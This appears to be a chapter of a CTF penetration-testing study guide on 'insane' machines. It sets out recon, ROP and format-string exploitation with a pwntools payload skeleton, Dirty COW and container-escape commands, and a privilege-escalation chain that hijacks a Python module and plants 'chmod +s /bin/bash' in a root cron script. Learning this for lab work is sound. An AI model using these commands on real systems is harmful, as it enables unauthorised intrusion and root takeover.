[◀ Prev: Hard Machines](09-hard-machines.md) · [🏠 Index](README.md) · [Next: Post-Exploitation ▶](11-post-exploitation.md)

---

# 10 · 🟣 Insane Machines — Complete Methodology

> [!NOTE]
> **Insane machine mindset.** Insane machines demand a level of depth rarely seen in CTFs. You will encounter novel or near-zero-day vulnerabilities, binary exploitation requiring ROP chains or heap exploitation, kernel-level attacks, or complex multi-stage chains across multiple services and users. Research is mandatory — read CVE descriptions, exploit papers, and tool documentation. Expect to spend hours or days. The methodology is the same as always, but the depth at each stage is maximum.

## 10.1 Insane Machine — Reconnaissance Depth

```bash
# Every service must be investigated to its full depth

# Identify exact versions of all software
curl http://$TARGET/ -s | grep -i 'powered by\|version\|generator'
whatweb -a 4 http://$TARGET    # Most aggressive mode

# Check for git history, exposed backups, source archives
curl http://$TARGET/.git/config
curl http://$TARGET/.git/HEAD
git-dumper http://$TARGET/.git /tmp/git_repo

# Check /admin, /api, /swagger, /openapi.json, /docs
curl http://$TARGET/api/v1/ http://$TARGET/api/v2/ http://$TARGET/v1/ 2>/dev/null
curl http://$TARGET/swagger.json http://$TARGET/openapi.json 2>/dev/null

# SSL certificate analysis
openssl s_client -connect $TARGET:443 -showcerts 2>/dev/null | openssl x509 -noout -text
# Look for: SANs (alternative hostnames), Organization info

# Check all HTTP methods
curl -X OPTIONS http://$TARGET/ -v 2>&1 | grep Allow
curl -X TRACE http://$TARGET/ -v
```

## 10.2 Binary Exploitation — Insane Level

### Buffer Overflow with ASLR/NX

```bash
# Check binary protections
checksec --file=/path/to/binary
# Outputs: RELRO, Stack Canary, NX, PIE, Fortify

# Check if ASLR is enabled on system
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled, 1 = partial, 2 = full

# With ASLR disabled (randomize_va_space=0):
# Classic ret2libc — find system() and /bin/sh in libc
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep 'system\|str_bin_sh'

# With ASLR + NX (need ROP chain):
ROPgadget --binary /path/to/binary --rop --chain 'execve'
ropper -f /path/to/binary --search 'pop rdi; ret'

# ret2plt — bypass ASLR using PLT
objdump -d /path/to/binary | grep '@plt'

# SROP (sigreturn oriented programming)
# When only syscall gadget is available
```

### Heap Exploitation Basics

```bash
# Use-After-Free detection
valgrind --leak-check=full ./binary
# AddressSanitizer: clang/gcc -fsanitize=address

# Format string vulnerability
# If printf(user_input) — direct printf without format string
./binary '%x.%x.%x.%x'    # Stack leak
./binary '%s'             # Crash if pointer on stack
./binary '%n'             # Write to address

# FSOP (File Stream Oriented Programming) for heap
# Overflow into _IO_FILE struct
```

```python
# pwntools skeleton for binary exploitation
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

p = process('./binary')    # or remote(TARGET, PORT)
elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Build payload
payload  = b'A' * offset
payload += p64(elf.plt['puts'])    # ROP: call puts to leak libc
payload += p64(elf.sym['main'])    # Return to main
p.sendlineafter(b'>', payload)
```

## 10.3 Kernel Exploitation — Insane Level

```bash
# Check for kernel vulnerabilities
uname -r && cat /proc/version
grep -i 'kernel' /var/log/kern.log 2>/dev/null | head -20

# DirtyPipe (CVE-2022-0847) — kernel 5.8 to 5.16.11
# Write arbitrary data to any file (including SUID binaries)
# Directly overwrites /etc/passwd root entry or injects SUID binary

# Dirty COW (CVE-2016-5195) — older systems kernel < 4.8.3
# Race condition in copy-on-write — write to read-only mapping
gcc -pthread dirty.c -o dirty -lcrypt
./dirty yourpassword
# Creates firefart user with root privs

# Namespace escape — if in container
# Check if in container:
cat /proc/1/cgroup | grep 'docker\|lxc'
ls /.dockerenv 2>/dev/null

# Container escape via privileged container
# If --privileged flag:
fdisk -l    # List host disks
mount /dev/sda1 /mnt
chroot /mnt
```

## 10.4 Complex Privilege Escalation Chains

### Custom SUID Binary Reverse Engineering

```bash
# Full analysis pipeline for unknown SUID binary

# 1. Static analysis
file /path/to/binary
strings /path/to/binary | less
objdump -d /path/to/binary | less
readelf -a /path/to/binary

# 2. Library calls
ltrace /path/to/binary 2>&1
strace /path/to/binary 2>&1

# 3. Dynamic analysis
gdb /path/to/binary
# (gdb) break main
# (gdb) run
# (gdb) info functions
# (gdb) disassemble main

# 4. Ghidra / radare2 for decompilation
r2 -A /path/to/binary
# r2: afl (list functions), pdf @main (disassemble main)
```

### Multi-Hop Privilege Escalation

```bash
# Pattern: www-data -> user1 -> user2 -> root

# Step 1: www-data -> user1
# Found config file with user1 credentials
cat /var/www/html/config.php | grep -i 'user\|pass\|db'
su - user1

# Step 2: user1 -> user2
# user1 has sudo rights to run a script owned by user2
sudo -u user2 /opt/scripts/process.py
# Script imports a module we can hijack:
echo 'import os; os.system("bash")' > /home/user1/module.py
PYTHONPATH=/home/user1 sudo -u user2 /opt/scripts/process.py

# Step 3: user2 -> root
# user2 has a cron running as root
# user2 can write to the cron script
echo 'chmod +s /bin/bash' >> /opt/cleanup.sh
```

---

[◀ Prev: Hard Machines](09-hard-machines.md) · [🏠 Index](README.md) · [Next: Post-Exploitation ▶](11-post-exploitation.md)
